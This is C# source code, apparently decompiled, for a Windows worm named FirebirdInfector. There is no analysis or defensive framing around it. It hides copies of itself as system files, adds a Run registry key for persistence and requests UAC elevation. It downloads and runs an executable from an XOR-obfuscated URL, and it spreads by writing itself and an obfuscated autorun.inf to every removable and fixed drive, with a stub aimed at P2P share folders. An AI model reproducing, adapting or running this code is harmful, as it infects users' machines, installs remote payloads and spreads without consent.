using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace FirebirdInfector;

internal class Program
{
	private static string EncryptDecrypt(string textToEncrypt)
	{
		int num = 129;
		StringBuilder stringBuilder = new StringBuilder(textToEncrypt);
		StringBuilder stringBuilder2 = new StringBuilder(textToEncrypt.Length);
		for (int i = 0; i < textToEncrypt.Length; i++)
		{
			char c = stringBuilder[i];
			c = (char)(c ^ num);
			stringBuilder2.Append(c);
		}
		return stringBuilder2.ToString();
	}

	private static void pathCheck(string normalPath, string currentPath)
	{
		if (normalPath != currentPath)
		{
			if (!File.Exists(normalPath))
			{
				File.Copy(currentPath, normalPath, overwrite: true);
				File.SetAttributes(normalPath, File.GetAttributes(normalPath) | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
			}
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = normalPath;
			Process.Start(processStartInfo);
			Environment.Exit(0);
		}
	}

	private static void RunElevated(string fileName)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Verb = "runas";
		processStartInfo.FileName = fileName;
		processStartInfo.Arguments = "runasadmin";
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Win32Exception)
		{
			Console.WriteLine("Probably the user canceled the UAC window...");
		}
	}

	private static void startupCheck(bool runasadmin)
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
		if (registryKey.GetValue("oleaut_32") == null)
		{
			try
			{
				registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey.SetValue("oleaut_32", "\"" + Path.GetFullPath(Assembly.GetExecutingAssembly().Location) + "\"");
			}
			catch (Exception)
			{
				if (runasadmin)
				{
					RunElevated(Path.GetFullPath(Assembly.GetExecutingAssembly().Location));
					Environment.Exit(0);
				}
				else
				{
					Console.WriteLine("Cant write to registry...");
				}
			}
		}
		registryKey.Close();
	}

	private static void downloadExec(string executableURL, string executablePath)
	{
		try
		{
			WebClient webClient = new WebClient();
			if (File.Exists(executablePath))
			{
				File.SetAttributes(executablePath, FileAttributes.Normal);
			}
			webClient.DownloadFile(executableURL, executablePath);
			File.SetAttributes(executablePath, File.GetAttributes(executablePath) | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
		}
		catch (WebException)
		{
			Console.WriteLine("Cannot download executable, continuing...");
		}
	}

	private static void runExec(string executablePath)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = executablePath;
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Win32Exception)
		{
			Console.WriteLine("Cannot run executable, continuing...");
		}
	}

	private static void infectP2P(string currentPath)
	{
		Path.GetFullPath(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\eMule\\Incoming\\");
		Path.GetFullPath(Environment.GetEnvironmentVariable("LOCALAPPDATA") + "\\Ares\\My Shared Folder\\");
	}

	private static void WriteToFile(string file, string content)
	{
		StreamWriter streamWriter = File.CreateText(file);
		streamWriter.WriteLine(content);
		streamWriter.Close();
	}

	private static void copy2Drives(string autorunEXE, string currentPath, string[] autorunINF)
	{
		while (true)
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string text in array)
			{
				if (!(text != "A:\\") || !(text != "B:\\") || !(new DriveInfo(text).DriveType.ToString() != "CDRom"))
				{
					continue;
				}
				try
				{
					if (File.Exists(text + autorunEXE))
					{
						File.SetAttributes(text + autorunEXE, FileAttributes.Normal);
					}
					if (File.Exists(text + "autorun.inf"))
					{
						File.SetAttributes(text + "autorun.inf", FileAttributes.Normal);
					}
					File.Copy(currentPath, text + autorunEXE, overwrite: true);
					File.SetAttributes(text + autorunEXE, File.GetAttributes(text + autorunEXE) | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
					File.WriteAllLines(text + "autorun.inf", autorunINF);
					File.SetAttributes(text + "autorun.inf", File.GetAttributes(text + "autorun.inf") | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
				}
				catch (UnauthorizedAccessException)
				{
					Console.WriteLine("Can't write to " + text + " (Unauthorized)...");
				}
				catch (IOException)
				{
					Console.WriteLine("Can't write to " + text + " (I\\O Error)...");
				}
				Thread.Sleep(3000);
			}
		}
	}

	private static void Main(string[] args)
	{
		string text = Environment.GetEnvironmentVariable("PUBLIC");
		if (text == null)
		{
			text = "C:\\Documents and Settings\\All Users\\Documentos";
		}
		string fullPath = Path.GetFullPath(text + "\\oleaut_32.exe");
		string fullPath2 = Path.GetFullPath(Assembly.GetExecutingAssembly().Location);
		string executableURL = EncryptDecrypt("éõõñ»®®õóëâîïïäâõ\u00afïî¬èñ\u00afîóæ®õóë®ìàèï\u00afäùä");
		string fullPath3 = Path.GetFullPath(Environment.GetEnvironmentVariable("PUBLIC") + "\\main.exe");
		string text2 = "autorun.exe";
		string[] autorunINF = new string[10]
		{
			EncryptDecrypt("ÚàôõîóôïÜ"),
			EncryptDecrypt("îñäï¼âìå¡®â¡£äùñíîóäó¡\u00af¡§¡") + text2 + EncryptDecrypt("£"),
			EncryptDecrypt("òéäííäùäâôõä¼âìå¡®â¡£äùñíîóäó¡\u00af¡§¡") + text2 + EncryptDecrypt("£"),
			EncryptDecrypt("òéäííÝàãóèó¼§Àãóèó¡äï¡âàóñäõà"),
			EncryptDecrypt("òéäííÝàãóèóÝâîììàïå¼âìå¡®â¡£äùñíîóäó¡\u00af¡§¡") + text2 + EncryptDecrypt("£"),
			EncryptDecrypt("òéäíí¼àãóèó"),
			EncryptDecrypt("òéäííÝäùñíîóàó¼§Äùñíîóàó"),
			EncryptDecrypt("òéäííÝäùñíîóàóÝâîììàïå¼âìå¡®â¡£äùñíîóäó¡\u00af¡§¡") + text2 + EncryptDecrypt("£"),
			EncryptDecrypt("òéäíí¼äùñíîóàó"),
			EncryptDecrypt("ÔòäÀôõîÑíàø¼°")
		};
		bool runasadmin = ((args.Length == 0) ? true : false);
		pathCheck(fullPath, fullPath2);
		startupCheck(runasadmin);
		downloadExec(executableURL, fullPath3);
		runExec(fullPath3);
		infectP2P(fullPath2);
		copy2Drives(text2, fullPath2, autorunINF);
		Thread.Sleep(5000);
	}
}
